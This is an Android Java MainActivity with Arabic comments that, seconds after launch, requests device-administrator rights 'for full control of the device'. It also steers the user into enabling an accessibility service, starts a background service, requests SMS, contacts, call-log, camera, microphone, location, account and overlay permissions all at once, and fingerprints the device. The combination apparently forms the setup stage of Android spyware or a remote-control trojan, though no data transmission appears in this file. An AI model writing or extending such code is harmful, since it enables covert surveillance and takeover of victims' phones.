package com.my.newproject3;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.Button;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class MainActivity extends Activity {
    
    private Button btnAccessibility;
    private Button btnAdmin;
    private Button btnDeviceId;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        // تهيئة الأزرار
        btnAccessibility = findViewById(R.id.btn_accessibility);
        btnAdmin = findViewById(R.id.btn_admin);
        btnDeviceId = findViewById(R.id.btn_device_id);
        
        // زر تفعيل خدمة الوصول
        btnAccessibility.setOnClickListener(v -> {
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            Toast.makeText(this, "🔧 قم بتفعيل خدمة الوصول للتطبيق", Toast.LENGTH_LONG).show();
        });
        
        // زر تفعيل صلاحيات المدير
        btnAdmin.setOnClickListener(v -> {
            requestDeviceAdmin();
        });
        
        // زر عرض معرف الجهاز
        btnDeviceId.setOnClickListener(v -> {
            String deviceId = getDeviceUniqueId();
            Toast.makeText(this, "🆔 معرف الجهاز:\n" + deviceId, Toast.LENGTH_LONG).show();
        });
        
        // طلب الصلاحيات وتفعيل الخدمات تلقائياً بعد 1.5 ثانية
        final android.os.Handler handler = new android.os.Handler(android.os.Looper.getMainLooper());
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                // طلب صلاحيات المدير
                requestDeviceAdmin();
                
                // طلب جميع الصلاحيات
                requestAllPermissions();
                
                // التحقق من تفعيل خدمة الوصول
                if (!isAccessibilityServiceEnabled(MainActivity.this)) {
                    Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(intent);
                    Toast.makeText(MainActivity.this, "🔧 قم بتفعيل خدمة الوصول", Toast.LENGTH_LONG).show();
                } else {
                    Toast.makeText(MainActivity.this, "✅ خدمة الوصول مفعلة", Toast.LENGTH_SHORT).show();
                }
                
                // تشغيل الخدمة
                startService(new Intent(MainActivity.this, MyAccessService.class));
            }
        }, 1500);
    }
    
    // طلب صلاحيات المدير
    public void requestDeviceAdmin() {
        try {
            ComponentName admin = new ComponentName(this, MyAdminReceiver.class);
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
            if (dpm != null && !dpm.isAdminActive(admin)) {
                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "🔒 مطلوب صلاحيات المدير للتحكم الكامل بالجهاز");
                startActivity(intent);
                Toast.makeText(this, "👑 قم بتفعيل صلاحيات المدير", Toast.LENGTH_LONG).show();
            } else {
                Toast.makeText(this, "✅ صلاحيات المدير مفعلة", Toast.LENGTH_SHORT).show();
            }
        } catch (Exception e) {
            Toast.makeText(this, "⚠️ خطأ: " + e.getMessage(), Toast.LENGTH_SHORT).show();
        }
    }
    
    // طلب جميع الصلاحيات المطلوبة
    public void requestAllPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            String[] permissions = {
                android.Manifest.permission.READ_SMS,
                android.Manifest.permission.SEND_SMS,
                android.Manifest.permission.READ_CONTACTS,
                android.Manifest.permission.READ_CALL_LOG,
                android.Manifest.permission.CAMERA,
                android.Manifest.permission.RECORD_AUDIO,
                android.Manifest.permission.ACCESS_FINE_LOCATION,
                android.Manifest.permission.ACCESS_COARSE_LOCATION,
                android.Manifest.permission.GET_ACCOUNTS,
                android.Manifest.permission.READ_EXTERNAL_STORAGE,
                android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
                android.Manifest.permission.CALL_PHONE,
                android.Manifest.permission.SYSTEM_ALERT_WINDOW
            };
            
            java.util.ArrayList<String> permissionsToRequest = new java.util.ArrayList<>();
            for (String perm : permissions) {
                if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                    permissionsToRequest.add(perm);
                }
            }
            
            if (!permissionsToRequest.isEmpty()) {
                String[] permsArray = permissionsToRequest.toArray(new String[0]);
                ActivityCompat.requestPermissions(this, permsArray, 1000);
                Toast.makeText(this, "🔐 يرجى منح جميع الصلاحيات", Toast.LENGTH_LONG).show();
            } else {
                Toast.makeText(this, "✅ جميع الصلاحيات مفعلة", Toast.LENGTH_SHORT).show();
            }
        }
    }
    
    // التحقق من تفعيل خدمة الوصول
    public boolean isAccessibilityServiceEnabled(Context context) {
        try {
            String prefString = Settings.Secure.getString(
                context.getContentResolver(),
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            );
            return prefString != null && prefString.contains(context.getPackageName());
        } catch (Exception e) {
            return false;
        }
    }
    
    // الحصول على معرف الجهاز الفريد
    private String getDeviceUniqueId() {
        try {
            String androidId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
            String deviceId = "";
            
            android.telephony.TelephonyManager tm = (android.telephony.TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            if (tm != null) {
                try {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        if (checkSelfPermission(android.Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                            deviceId = tm.getDeviceId();
                        }
                    } else {
                        deviceId = tm.getDeviceId();
                    }
                } catch (Exception e) {}
            }
            
            if (deviceId == null || deviceId.isEmpty()) {
                deviceId = androidId;
            }
            
            if (deviceId == null || deviceId.isEmpty()) {
                deviceId = Build.SERIAL;
            }
            
            if (deviceId == null || deviceId.isEmpty()) {
                deviceId = "DEVICE_" + System.currentTimeMillis();
            }
            
            return deviceId + "_" + Build.MODEL.replace(" ", "_");
        } catch (Exception e) {
            return "UNKNOWN_" + System.currentTimeMillis();
        }
    }
    
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == 1000) {
            boolean allGranted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            if (allGranted) {
                Toast.makeText(this, "✅ تم منح جميع الصلاحيات", Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(this, "⚠️ بعض الصلاحيات لم يتم منحها", Toast.LENGTH_LONG).show();
            }
        }
    }
    
    @Override
    protected void onResume() {
        super.onResume();
        // التحقق من الخدمة عند العودة
        if (isAccessibilityServiceEnabled(this)) {
            Toast.makeText(this, "✅ خدمة الوصول مفعلة", Toast.LENGTH_SHORT).show();
        }
    }
}
